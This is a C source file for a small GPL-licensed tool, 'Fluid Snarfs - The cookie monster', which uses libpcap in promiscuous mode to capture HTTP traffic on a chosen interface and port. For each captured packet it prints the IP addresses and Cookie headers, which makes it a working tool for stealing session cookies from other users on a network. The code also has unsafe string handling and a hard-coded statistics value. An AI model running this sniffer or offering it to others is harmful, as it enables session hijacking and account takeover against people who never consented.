/*
 * Fluid Snarfs - The cookie monster
 * fluidsnarfs.c
 * 
 * I'm a HTTP cookie eater moster.
 *
 * Copyright (c) 2008 Sebastián Castillo Builes <castillobuiles@gmail.com>
 * All rights reserved.
 * 
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   For a copy of the GNU General Public License see the LICENSE file
 *   or see <http://www.gnu.org/licenses/>
 *
 */

#include <stdio.h>      /* standard buffered input/output */
#include <pcap.h>       /* tcpdump packet capture library */
#include <arpa/inet.h>  /* definitions for internet operations */
#include <stdlib.h>
#include <net/if.h>     /* device name size */
#include <string.h>     /* memset */

#include <unistd.h>     /* getuid */
#include <ctype.h>      /* isprint */

#include <time.h>       /* date time stuff */

#include <signal.h>     /* to manage SIGINT */

#include "../includes/fluidsnarfs.h"

static char pcap_errbuf[PCAP_ERRBUF_SIZE];       /* sniffer error buffer */

/*
 * Device management
 *
 * device_get_inet4_addr: Gets the ip address for the specified device
 * device_check_link: check link type
 * 
 */
static bpf_u_int32 device_get_inet4_addr(char *dev_name)
{
  bpf_u_int32 net, mask;
  if(pcap_lookupnet(dev_name, &net, &mask, pcap_errbuf) == -1){
    fprintf(stderr, "\nError getting device inet address:\n%s\n", pcap_errbuf);
    return 0;
  }
  return net;
}

static int device_check_link(pcap_t *pcap, char *dev_name)
{
  if (pcap_datalink(pcap) != DLT_EN10MB) {
    fprintf(stderr, "%s is not an Ethernet device\n", dev_name);
    return -1;
  }
  return 0;
}


/*
 * legal banner
 */
void print_banner(void)
{

  printf("My name is %s,\n%s\nversion %s\n", APP_NAME, APP_DESC, APP_VERSION);
  printf("\n%s\n", APP_COPYRIGHT);
  printf("%s\n", APP_DISCLAIMER);
  printf("\n");

  return;
}

/*
 * usage syntax
 */
 void print_usage(void)
 { 
   printf("Usage: %s [interface]\n", APP_NAME);
   printf("\n");
   printf("Options:\n");
   printf("\tinterface\tNetwork interface for listen on.\n");
   printf("\n");
   
   return;
 }


/* ------------------------------------------------------------
 *  For information about following code, view cookimonster.h
 * ------------------------------------------------------------
 */

unsigned char * seek_cookie(const unsigned char *payload, int len)
{
  unsigned char *cookie;

  cookie = (unsigned char*) strstr((char*)payload, "Cookie");

  return cookie;
}


/*
 * HTTP sniffer
 */

static int http_sniff_packets(pcap_t * pcap)
{

  if(pcap_loop(pcap, -1, http_sniff_read_packets, NULL) < 0){
    http_sniff_close_packets(pcap);
    return -1;
  }
  
  http_sniff_close_packets(pcap);
  return 0;
}

void http_sniff_read_packets(unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *packet)
{
  static int count = 1;
  
  // TODO: Dont do the printf here!!, improve the way to get payload withouth all ether, ip, tcp stuff                                                                                                              
  // const struct ethernet_headed *ether;
  const struct ip_header *ip;
  const struct tcp_header *tcp;
  const unsigned char *payload;
  const unsigned char *cookie;

  int size_ip, size_tcp = 0, size_payload = 0;

  const unsigned char *ch;

  //ether = (struct ethernet_header*)(packet);

  ip = (struct ip_header*)(packet + SIZE_ETHERNET);
  if( (size_ip = IP_HL(ip)*4) < 20){
    printf("   * Invalid IP header length: %u bytes\n", size_ip);
    return;
  }

  if(ip->ip_p != IPPROTO_TCP){
    printf("\ninvalid protocol\n");
    return;
  }
  
  tcp = (struct tcp_header*)(packet + SIZE_ETHERNET + size_ip);
  if ((size_tcp = TH_OFF(tcp)*4) < 20){
    printf("Invalid TCP header length: %u bytes\n", size_tcp);
    return;
  }

  
  payload = (unsigned char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
  size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

  if(size_payload > 0){
    if( (cookie = seek_cookie(payload, size_payload)) != NULL ){
      /* print source and destination IP addresses */
      printf("from: %s\n", inet_ntoa(ip->ip_src));
      printf("to: %s\n", inet_ntoa(ip->ip_dst));
      printf("payload (%d bytes):\n", size_payload);
      
      ch = cookie;
      while(*ch != '\n'){
	if(isprint(*ch)){
	  printf("%c", *ch);
	}else{
	  printf(".");
	}
	  ch++;
      }
      
      printf("\n");
      printf("%d packets since start\n\n", count);
      count ++;
    }
  }
  
  return;
}

static void http_sniff_close_packets(pcap_t *pcap)
{
  pcap_close(pcap);
  return;
}

static pcap_t * http_sniff_open_packets(char *dev_name, bpf_u_int32 dev_inet4_addr, char *port)
{
  pcap_t *pcap;
  
  char *filter;
  //TODO: sprintf
  #define PREFILTER "port "

  struct bpf_program compiled_filter;

  filter = (char *) calloc( strlen(port) + strlen(PREFILTER), sizeof(char) );
  strcat(filter, PREFILTER);
  strcat(filter, port);

  if((pcap = pcap_open_live(dev_name, BUFSIZ, 1, 0, pcap_errbuf)) == NULL){
    fprintf(stderr, "\nError opening device for sniffing session:\n%s\n", pcap_errbuf);
    return NULL;
  }
  
  if((pcap_compile(pcap, &compiled_filter, filter, 1000, dev_inet4_addr)) < 0){
    fprintf(stderr, "\nError compiling pcap filter:\n%s\n", pcap_geterr(pcap));
    return NULL;
  }

  if((pcap_setfilter(pcap, &compiled_filter)) < 0){
    fprintf(stderr, "\nError setting pcap filter:\n%s\n", pcap_geterr(pcap));
    return NULL;
  }

  pcap_freecode(&compiled_filter);

  return pcap;
}


/* Catch SIGINT, show stats and exit*/
/* FIXME: How to pass pcap_t to signal manager??*/
/* I dont wanna have a global stuff :( */
static void http_sniff_signal(int signal)
{
  /*struct pcap_stat stats;

  if (pcap_stats(pcap, &stats) < 0){
    fprintf(stderr, pcap_geterr(pcap));
    exit(EXIT_FAILURE);
    }*/

  printf("\n---Stats:\n\n");
  printf("Received: %d\n", 2);//stats.ps_recv);
  exit(EXIT_SUCCESS);
}



int main (int argc, char* argv[])
{ 
  pcap_t *pcap;
  char *dev_name = argv[1]; // TODO: gestionar interfaz por defecto y protegerse de la entrada. optparse?
  bpf_u_int32 dev_inet4_addr;
  
  char *port; /* port to pcap_filter traffic */

  uid_t uid;

  time_t rawtime;
  struct tm *timeinfo;
  

  if(argc > 3 || argc < 2){
    fprintf(stderr, "\nERROR: Invalid number of arguments!\n\n");
    print_usage();
    exit(EXIT_FAILURE);
  }else if(argc == 3){
    port = argv[2];
  }else{
    port = DEFAULT_PORT;
  }

  if( (uid = getuid()) != ROOT_USER){
    fprintf(stderr, "\nERROR: Sorry uid %d, you've to make your own sandwich.\n\n", uid);
    print_usage();
    exit(EXIT_FAILURE);
  }

  if((dev_inet4_addr = device_get_inet4_addr(dev_name)) == 0){
    exit(EXIT_FAILURE);
  }
  if((pcap = http_sniff_open_packets(dev_name, dev_inet4_addr, port)) == NULL){
    exit(EXIT_FAILURE);
  }
  if((device_check_link(pcap, dev_name)) == -1){
    exit(EXIT_FAILURE);
  }
  //TODO: get_time()
  time(&rawtime);
  timeinfo = localtime(&rawtime);
  
  print_banner();
 
  signal(SIGINT, http_sniff_signal);
  
  printf("Eating cookies from [%s], port [%s]\n", dev_name, port);
  printf("%s", asctime(timeinfo));
  http_sniff_packets(pcap);
  return 0;
}
// fluidsnarfs.c
